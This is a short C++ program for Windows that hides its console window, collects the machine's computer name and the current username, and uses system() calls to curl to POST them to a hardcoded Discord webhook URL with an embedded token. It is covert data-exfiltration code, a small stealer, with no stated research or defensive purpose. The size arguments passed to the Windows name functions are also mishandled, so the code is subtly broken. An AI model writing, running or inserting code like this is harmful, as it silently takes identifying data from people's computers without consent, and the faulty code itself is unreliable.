#include<iostream>
#include<Windows.h>
#include<string>
#include <lmcons.h>
int main() {

	ShowWindow(GetConsoleWindow(), SW_HIDE);

	char user[UNLEN + 1];
	DWORD userSize[UNLEN + 1];

	char computer[UNLEN + 1];
	DWORD computerName[UNLEN + 1];

	GetComputerNameA(computer, computerName);
	GetUserNameA(user, userSize);


	std::string url = "https://discord.com/api/webhooks/1388901884831731902/G4kf5m-5xZTiDMV9RWzaGfsjM3rHQfQ-Zy9ekcIwYf9MdotFpl4s8Tw49oNhY1SZTxmK";
	const std::string cmd_1 = "curl -i -H \"Accept: application/json\" -H \"Content-Type:application/json\" -X POST --data \"{\\\"content\\\": \\\"";
	const std::string cmd_2 = "\\\"}\" ";
	std::string computerN = cmd_1 + "**[+] Computer Name: **" + computer + cmd_2 + url;
	std::string UserN = cmd_1 + "**[+] Username: **" + user + cmd_2 + url;

	system(computerN.c_str());
	system(UserN.c_str());

	return 0;
}